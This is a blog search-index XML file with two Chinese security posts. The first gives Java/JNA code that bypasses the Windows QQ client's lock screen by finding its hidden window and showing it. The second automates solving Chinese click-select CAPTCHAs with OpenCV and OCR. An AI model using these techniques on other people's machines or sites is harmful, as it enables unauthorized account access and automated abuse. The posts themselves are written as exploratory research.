<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Windows版本QQ锁定可被绕过]]></title>
      <url>/2018/11/19/QQ-Lock-bypass/</url>
      <content type="html"><![CDATA[<p>在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。<br><a id="more"></a></p>
<p><img src="/2018/11/19/QQ-Lock-bypass/640.png" alt="虚线阴影分割线"></p>
<h1 id="情景还原"><a href="#情景还原" class="headerlink" title="情景还原"></a>情景还原</h1><hr>
<p>首先演示一下如何使用抢票软件进行QQ锁定的绕过。这里以最新版本<a href="https://dldir1.qq.com/qqfile/qq/QQ9.0.7/24121/QQ9.0.7.24121.exe" target="_blank" rel="noopener">9.0.7（24121）</a>为例。下载后正常安装。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/01.png" alt="1542639823372"></p>
<p>安装后查看版本。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/02.png" alt="1542640660482"></p>
<p>将QQ锁定，然后打开软件，选择QQ通知，点击“获取聊天窗口”，此时会进行QQ窗体的加载，然后在“要发送的窗口”下拉框会显示一个随机字符串，点击“测试发送”按钮，会发现QQ控制面板弹出。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/03.png" alt="1542641095561"></p>
<p>而且是可以进行未锁定前的所有功能。如发送和接收消息，如图所示。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/04.png" alt="1542720813184"></p>
<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>刚开始的想法是首先获取QQ窗口的句柄，然后再利用句柄进行显示与隐藏。</p>
<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一"></a>尝试一</h2><p>这里采用的是精易编程助手来获取句柄，当qq处于非锁定状态，获取QQ窗体句柄后，可以利用句柄对QQ进行隐藏或显示，即使把QQ锁定，也可以进行隐藏或者显示。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/05.gif" alt="1542722213724"></p>
<p>但是当QQ隐藏后，此时再获取句柄后，无法绕过QQ的锁定。这时候获取的句柄为QQ锁定状态的句柄。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/06.gif" alt="1542722213724"></p>
<blockquote>
<p>该方法只能对未锁定的QQ进行操作，锁定后就无法获取控制面板句柄了，因此该方法行不通。</p>
</blockquote>
<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二"></a>尝试二</h2><p>放弃了精易编程助手，采用更专业的工具spy++。找到句柄后发现标题为一串随机的字符串，与抢票工具获取聊天窗口中标题一样。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/07.png" alt="1542724530787"></p>
<p>猜测需要最终需要获取的句柄就是这个，句柄对应的十六进制为504BE，然后调用windows api进行窗口的显示和隐藏。</p>
<p>显示窗口<code>ShowWindow (句柄, 1)</code>，隐藏窗口<code>ShowWindow (句柄, 0)。</code></p>
<p>效果如图所示。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/08.gif" alt="1542724530787"></p>
<blockquote>
<p>这样虽然能够满足，但是却不够智能，无法自动获取句柄，需要借助其他工具去寻找句柄，因此放弃。</p>
</blockquote>
<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三"></a>尝试三</h2><p>本次测试中走了两条“弯路”，在这里简要说明一下，就不再附详细的过程了。某次发现使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄=FindWindowA (“TXGuiFoundation”, “TXMenuWindow”)</span><br><span class="line">句柄=窗口_取父句柄 (窗口_取父句柄 (临时_句柄))</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄=FindWindowA (“TXGuiFoundation”, “”)</span><br><span class="line">句柄=窗口_取父句柄 (临时_句柄)</span><br></pre></td></tr></table></figure>
<p>可以获取到QQ锁定时控制面板的句柄。如图所示</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/09.gif" alt="1542724530787"></p>
<blockquote>
<p>但这些只是概率事件，多数情况下还是不行的。即使可以使用这两种方法，但是这两种方法获取的都是一个句柄，当有两个QQ时，就无法同时获取两个句柄了，所以该方法不可取。</p>
</blockquote>
<p>由于QQ处于锁定时，窗口标题为随机的字符串，所以无法使用FindWindowA这种方法了。</p>
<h2 id="尝试四之最终实现"><a href="#尝试四之最终实现" class="headerlink" title="尝试四之最终实现"></a>尝试四之最终实现</h2><p>此时想到另外一个思路，遍历屏幕上所有的顶层窗口，然后根据条件进行筛选。</p>
<p>这里用的Java来实现，操作Windows API采用了<a href="https://github.com/java-native-access/jna" target="_blank" rel="noopener">JNA</a>。</p>
<blockquote>
<p>JNA的全称是Java Native Access，你只要在一个java接口中描述本地库中的函数与结构， JNA将在运行期动态访问本地库，自动实现Java接口到本地库函数的映射。</p>
</blockquote>
<p>使用maven加入所需的依赖。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna-platform<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>枚举屏幕上所有的顶层窗口采用的是<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">EnumWindows</a>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">EnumWindows</span><span class="params">(WinUser.WNDENUMPROC lpEnumFunc,</span></span></span><br><span class="line"><span class="function"><span class="params">                    Pointer data)</span></span></span><br></pre></td></tr></table></figure>
<p>该函数枚举屏幕上所有的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数。回调函数返回FALSE将停止枚举，否则EnumWindows函数继续到所有顶层窗口枚举完为止。</p>
<p>参数：lpEnumFunc - 指向应用程序定义的回调函数的长指针。</p>
<p>参数：data - 指定要传递给回调函数的应用程序定义的值。</p>
<p>代码实现如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">    public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123;</span><br><span class="line">        System.out.println(hwnd);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,null);</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/19/QQ-Lock-bypass/10.png" alt="1542765670181"></p>
<p>此时获取的时所有顶层窗口的句柄，剩下的就是去如何进行过滤，留下所需的句柄。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/11.png" alt="1542766813276"></p>
<p>通过对比发现，可以用窗口样式进行区分。当QQ锁定时（或QQ未锁定且最小化时），对应的窗口样式为860C0000（十进制为2248933376）。</p>
<p>下面为QQ锁定时的样式。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/12.png" alt="1542766908014"></p>
<p>通过查询API，可以用<code>User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>来获取窗口样式。然后通过这种方法进行过滤，当该值为2248933376，则认为对应的hwnd为QQ控制面板的句柄。</p>
<p>主要代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                		<span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    System.out.println(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/19/QQ-Lock-bypass/13.png" alt="1542767244090"></p>
<p>可以看到成功获取了QQ锁定时控制面板的句柄。有了句柄，就可以进行之前的操作了，如显示与隐藏。</p>
<blockquote>
<p>当QQ未锁定时，QQ弹出时对应的窗口样式为960c0000（十进制为2517368832）。</p>
</blockquote>
<p><img src="/2018/11/19/QQ-Lock-bypass/14.png" alt="1542768137649"></p>
<p>此时就可以先通过<code>EnumWindows</code>枚举所有的窗口，然后再使用<code>GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>获取窗口样式进行匹配，匹配到所需的窗口。</p>
<p>这里将QQ锁定和未锁定的情况都考虑进去，然后获取QQ控制面板的句柄。之后通过<code>GetWindowText</code>获取窗口的标题，再使用<code>ShowWindow</code>进行隐藏与显示操作。主要代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;WinDef.HWND&gt; lt = getQQHwnds();</span><br><span class="line">        <span class="keyword">for</span> (WinDef.HWND hwnd:lt) &#123;</span><br><span class="line">            <span class="keyword">char</span>[] titleBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">512</span>];</span><br><span class="line">            User32.INSTANCE.GetWindowText(hwnd,titleBuffer,<span class="number">512</span>);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> String(titleBuffer));</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">0</span>);<span class="comment">//隐藏</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;WinDef.HWND&gt; getQQHwnds()&#123;</span><br><span class="line">        <span class="keyword">final</span> List&lt;WinDef.HWND&gt; lt = <span class="keyword">new</span> ArrayList&lt;WinDef.HWND&gt;();</span><br><span class="line"></span><br><span class="line">        User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2517368832L</span>||User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    lt.add(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> lt;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>首先获取到QQ控制面板的句柄，然后依次获取其标题，并进行<code>显示-隐藏-显示</code>等过程。效果如图所示。</p>
<p><img src="/2018/11/19/QQ-Lock-bypass/15.gif" alt="1542768137649"></p>
<blockquote>
<p>这种成功实现了QQ锁定时自动获取控制面板句柄，实现了QQ锁定的绕过。而且有多个QQ时，都可以获取其句柄。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在一次偶然的情况下可以绕过QQ锁定，于是就进行了尝试，走了一些弯路，最终实现了这种效果。主要过程就是<code>获取所有顶层窗口句柄-根据窗口样式匹配到QQ控制面板的句柄-使用ShowWindow进行显示</code>。也许这不是最佳的解决方法。如果大家有更好的方法或者建议，欢迎分享。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga</a></p>
<p>[2]<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之美 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 锁定绕过 </tag>
            
            <tag> Windows API </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[中文点选验证码自动识别]]></title>
      <url>/2018/08/16/Automatically-Identify-Chinese-Point-Selection/</url>
      <content type="html"><![CDATA[<p>某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。</p>
<a id="more"></a>
<h2 id="0x01-验证码的获取"><a href="#0x01-验证码的获取" class="headerlink" title="0x01  验证码的获取"></a>0x01  验证码的获取</h2><p>首先获取验证码。由于网站比较特殊，就不以他们的为例，自己生成验证码吧。这个不是重点，这里直接贴代码了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createImage</span><span class="params">($word,$imagePath,$type,$imageName)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $fontPath = <span class="string">'msyh.ttc'</span>;<span class="comment">//字体</span></span><br><span class="line">    $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($word <span class="keyword">as</span> $v ) &#123;</span><br><span class="line">        $fontarea  = imagettfbbox($fontSize, <span class="number">0</span>, $fontPath, $v);</span><br><span class="line">        $textWidth = $fontarea[<span class="number">2</span>] - $fontarea[<span class="number">0</span>];</span><br><span class="line">        $textHeight = $fontarea[<span class="number">1</span>] - $fontarea[<span class="number">7</span>];</span><br><span class="line">        $tmp[<span class="string">'text'</span>] = $v;</span><br><span class="line">        $tmp[<span class="string">'size'</span>] = $fontSize;</span><br><span class="line">        $tmp[<span class="string">'width'</span>] = $textWidth;</span><br><span class="line">        $tmp[<span class="string">'height'</span>] = $textHeight;</span><br><span class="line">        $textArr[] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($imageWidth, $imageHeight, $imageType) = getimagesize($imagePath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($textArr);$i++)&#123;</span><br><span class="line">        <span class="keyword">list</span>($x, $y) = randPosition($textArr, $imageWidth, $imageHeight, $textArr[$i][<span class="string">'width'</span>], $textArr[$i][<span class="string">'height'</span>],$i,$type);</span><br><span class="line">        $textArr[$i][<span class="string">'x'</span>] = $x;</span><br><span class="line">        $textArr[$i][<span class="string">'y'</span>] = $y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建图片的实例</span></span><br><span class="line">    $image = imagecreatefromstring(file_get_contents($imagePath));</span><br><span class="line">    <span class="comment">//字体颜色</span></span><br><span class="line">    $color = imagecolorallocate($image, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//绘画文字</span></span><br><span class="line">    <span class="keyword">foreach</span>($textArr <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        imagefttext($image, $v[<span class="string">'size'</span>], <span class="number">0</span>, $v[<span class="string">'x'</span>], $v[<span class="string">'y'</span>], $color, $fontPath, $v[<span class="string">'text'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(imagepng($image,$imageName))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $imageName.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randPosition</span><span class="params">($textArr, $imgW, $imgH, $fontW, $fontH,$i,$type)</span></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//生成mp</span></span><br><span class="line">			$x = rand($i*<span class="number">60</span>, ($i+<span class="number">1</span>)*<span class="number">60</span>-$fontW<span class="number">-3</span>);</span><br><span class="line">			$y = rand(<span class="number">40</span>,<span class="number">80</span>); </span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//生成ap</span></span><br><span class="line">			$x = ($i)*<span class="number">25</span>+<span class="number">5</span>;</span><br><span class="line">			$y = <span class="number">25</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    $return = <span class="keyword">array</span>($x, $y);</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ap_imagePath = <span class="string">'ap_bg.png'</span>;</span><br><span class="line">$mp_imagePath = <span class="string">'mp_bg.png'</span>;</span><br><span class="line">$ap_imageName = <span class="string">"ap_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$mp_imageName = <span class="string">"mp_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$ap_word = <span class="keyword">array</span>(<span class="string">'请'</span>,<span class="string">'依'</span>,<span class="string">'次'</span>,<span class="string">'点'</span>,<span class="string">'击'</span>,<span class="string">'图'</span>,<span class="string">'中'</span>,<span class="string">'的'</span>,<span class="string">'猎'</span>, <span class="string">'户'</span>,<span class="string">'室'</span>) ;</span><br><span class="line">$mp_word = <span class="keyword">array</span>(<span class="string">'猎'</span>, <span class="string">'户'</span>, <span class="string">'实'</span>,<span class="string">'验'</span>,<span class="string">'室'</span>);</span><br><span class="line">createImage($ap_word,$ap_imagePath,<span class="number">1</span>,$ap_imageName);</span><br><span class="line">createImage($mp_word,$mp_imagePath,<span class="number">0</span>,$mp_imageName);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后生成这样两张图片。</p>
<p>ap_XXXXX.png</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/ap-01.png" alt="1534127745391"></p>
<p>mp_XXXXX.png</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/mp-01.png" alt="1534127785857"></p>
<p>ap_XXXXX.png是说明需要点击的文字，mp_XXXXX.png是需要点击的图片。</p>
<h2 id="0x02-验证码识别"><a href="#0x02-验证码识别" class="headerlink" title="0x02  验证码识别"></a>0x02  验证码识别</h2><p>对于这种简单的点选验证码，可以有两种很容易的识别方式（机器学习算麻烦的，这里就不列出了。嗯，对，我也不会）。一种是opencv的图像模板匹配，另外一种是OCR识别。</p>
<h3 id="1-opencv的图像模板匹配"><a href="#1-opencv的图像模板匹配" class="headerlink" title="1. opencv的图像模板匹配"></a>1. opencv的图像模板匹配</h3><p>第一种方式，使用opencv的图像模板匹配。模板匹配是一种在较大图像中搜索和查找模板图像位置的方法，opencv2和opencv3中提供了一个专门用于模板匹配的函数matchTemplate()。它是在输入图像上滑动模板图像（如在2D卷积中），并比较模板图像下的输入图像的模板和补丁。在OpenCV中实现了六种比较方法（这里用到的是<code>cv2.TM_CCOEFF_NORMED</code>），它返回一个灰度图像，其中每个像素表示该像素的邻域与模板匹配的程度。</p>
<p>获得结果后，可以使用cv.minMaxLoc（）函数查找最大/最小值的位置。将其作为矩形的左上角，并将（w，h）作为矩形的宽度和高度，那个矩形就是模板区域。 。</p>
<p>我们进行使用模板匹配来识别这种验证码时，首先先将“模板”找出来，这里我们需要匹配的是“猎”、“户”、“室”这三个字。将这三个字所在的图片进行截取，然后使用matchTemplate()函数在mp中进行匹配。</p>
<p>首先截取第一个字“猎”。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534141199627.png" alt="1534141199627"></p>
<p>截取之后，就可以在mp中进行匹配。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534319979597.png" alt="1534319979597"></p>
<p>这里得到了最大和最小位置。我们使用最大位置，然后将最大值作为阈值。获取模板的尺寸，然后在mp中用矩形（红色区域）画出匹配的区域。如下所示。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534142377712.png" alt="1534142377712"></p>
<p>同理，用黄色和蓝色矩形将“户”、“室”所在的区域画出来。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534142664129.png" alt="1534142664129"></p>
<p>点选时发送所选区域中间的坐标即可，这里就不再给出实例了。</p>
<p>这种方法虽然简单，但是对于字体不一的就不能很正确的标记出来。</p>
<p>修改生成图片的代码，将mp中的文字的字体设置为随机。</p>
<p>修改的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//mp 文字随机大小</span></span><br><span class="line">        $fontSize = rand(<span class="number">20</span>,<span class="number">30</span>) * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//ap 文字固定</span></span><br><span class="line">        $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ap生成的结果还是和之前一样，mp的图片如下：</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534406354140.png" alt="1534406354140"></p>
<p>使用同样的代码来匹配。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534406412351.png" alt="1534406412351"></p>
<p>此时匹配的结果就有些惨不忍睹了。所以就换另外一种识别方式-ocr识别。</p>
<h3 id="2-OCR识别"><a href="#2-OCR识别" class="headerlink" title="2. OCR识别"></a>2. OCR识别</h3><p>这里采用的是腾讯云的<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">OCR-通用印刷体识别</a>。</p>
<p>参考文档。输入mp图片，返回的是json。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534407226287.png" alt="1534407226287"></p>
<p>查看json内容，发现包含了图片中的文字、位置和大小等。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534407260832.png" alt="1534407260832"></p>
<p>同理ap中内容也可以获取。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534407371139.png" alt="1534407371139"></p>
<p>此时匹配的时候直接就是匹配文字了。首先获取ap中后三个文字，然后与mp中返回的内容匹配，获取其位置和大小，然后再画矩形即可。</p>
<p>由于比较简单，这里直接贴结果。</p>
<p><img src="/2018/08/16/Automatically-Identify-Chinese-Point-Selection/1534408948730.png" alt="1534408948730"></p>
<p>匹配相当完美。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h2><p>本文用了两种方法来自动识别汉字点选验证码，第一种采用的是opencv的模板匹配，这种方法虽然也可以匹配到，但这种方法缺点就是对于字体形状差异较大的验证码识别率较低。而第二种方法就比较快捷方便了，而且识别度高，比较推荐第二种方法。</p>
<p>当然这两种方法对于简单、“正规”的验证码可以，遇到复杂的、“扭曲的”验证码就不行了。这时候就要用到机器学习了，而本文只是简单的“识别”，将机器学习用到这里，就有些大材小用了。</p>
<p>相关代码：<a href="https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection</a></p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p>[1] <a href="http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html" target="_blank" rel="noopener">http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html</a></p>
<p>[2]<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/866/17600</a></p>
]]></content>
      
        <categories>
            
            <category> 验证码识别 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 点选验证码 </tag>
            
            <tag> 验证码识别 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[upload-labs writeup]]></title>
